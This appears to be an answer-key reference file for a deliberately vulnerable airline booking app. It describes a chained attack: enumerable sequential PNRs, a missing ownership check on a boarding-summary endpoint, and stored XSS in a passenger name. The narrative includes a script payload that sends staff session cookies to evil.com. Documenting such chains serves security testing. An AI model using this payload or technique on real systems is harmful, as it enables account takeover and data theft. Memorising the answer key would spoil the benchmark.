# Chained Vulnerability Scenarios — Airline Booking

## Chain: "Sequential PNR Enumeration → Booking IDOR → Stored XSS on Staff View"

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | PNRs generated as a sequential integer counter (`BK000001`, `BK000002`, ...) — all valid booking references are trivially enumerable | Low | A04 | `PnrGenerator.java` → `generate()` |
| 2 | `GET /api/bookings/{pnr}/boarding-summary` performs no ownership check — any authenticated passenger can view any other passenger's booking details | Medium | A01 | `BookingController.java` → `getBoardingSummary()` |
| 3 | Passenger full name is embedded directly inside an HTML string (`<strong>Passenger:</strong> {name}`) returned by the API — a crafted name containing a script tag executes as XSS when rendered via `innerHTML` on the staff boarding management screen | Medium | A03 | `BookingController.java` → `getBoardingSummary()` |


**Attack narrative**: The attacker books a flight and registers with the name `</strong><script>fetch('https://evil.com/?c='+document.cookie)</script>`. They then enumerate boarding-summary endpoints from `BK000001` upward to find valid PNRs belonging to other passengers (no ownership check). When an airline staff member's browser renders the boarding list via `innerHTML`, the injected script fires and exfiltrates the staff session cookie to the attacker.

**Combined Impact**: Cross-passenger data exfiltration and staff account takeover via Stored XSS.

---

_This file is for internal reference. Ground truth vulnerability data is maintained in [.vulns](.vulns)._
